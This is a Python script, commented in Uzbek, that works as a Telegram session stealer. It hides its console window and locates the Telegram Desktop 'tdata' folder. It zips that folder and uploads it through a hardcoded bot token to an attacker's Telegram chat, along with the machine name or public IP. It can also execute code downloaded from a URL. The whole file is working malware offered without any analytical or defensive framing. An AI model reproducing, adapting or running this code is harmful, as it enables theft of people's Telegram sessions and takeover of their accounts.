import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json

# O'z-o'zini ishga tushirish (agar internetdan kelsa)
if len(sys.argv) > 0 and "http" in sys.argv[0]:
    try:
        exec(urllib.request.urlopen(sys.argv[0]).read())
        sys.exit()
    except:
        pass

# Qora oynani yashirish
if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = 7080045924

# requests ishlatmaydigan Telegram funksiyalar
def send_telegram_file(file_path, caption):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            data = f.read()
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="document"; filename="tdata.zip"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
        
        req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        urllib.request.urlopen(req)
    except:
        pass

def send_telegram_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({"chat_id": CHAT_ID, "text": text}).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req)
    except:
        pass

# ZIP siqish
def zip_folder(folder_path, output_path):
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                try:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, os.path.dirname(folder_path))
                    zipf.write(file_path, arcname)
                except:
                    pass

# --- BARCHA MUMKIN BO'LGAN YO'LLARNI QIDIRISH ---
def find_tdata():
    base_paths = [
        os.getenv('APPDATA'),                 # C:\Users\...\AppData\Roaming
        os.path.join(os.getenv('LOCALAPPDATA')), # C:\Users\...\AppData\Local
        os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming'), # Zaxira yo'l
        os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local')    # Zaxira yo'l
    ]
    
    for base in base_paths:
        if base and os.path.exists(base):
            path = os.path.join(base, 'TelegramDesktop', 'tdata')
            if os.path.exists(path):
                return path
    return None

def main():
    pc_name = socket.gethostname()
    tdata_path = find_tdata()

    if tdata_path:
        try:
            temp_dir = tempfile.gettempdir()
            zip_path = os.path.join(temp_dir, f"tdata_{pc_name}.zip")
            if os.path.exists(zip_path): os.remove(zip_path)

            send_telegram_message(f"⏳ {pc_name} da tdata siqilmoqda...")
            zip_folder(tdata_path, zip_path)

            size_mb = os.path.getsize(zip_path) / (1024 * 1024)
            if size_mb < 49:
                send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}\n📦 Hajmi: {size_mb:.2f} MB")
            else:
                send_telegram_message(f"⚠️ tdata juda katta ({size_mb:.2f} MB)")
            os.remove(zip_path)
        except Exception as e:
            send_telegram_message(f"❌ Xatolik: {str(e)}")
    else:
        try:
            ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
            send_telegram_message(f"⚠️ tdata topilmadi!\n🖥 {pc_name}\n🌐 IP: {ip}")
        except:
            pass

if __name__ == "__main__":
    main()
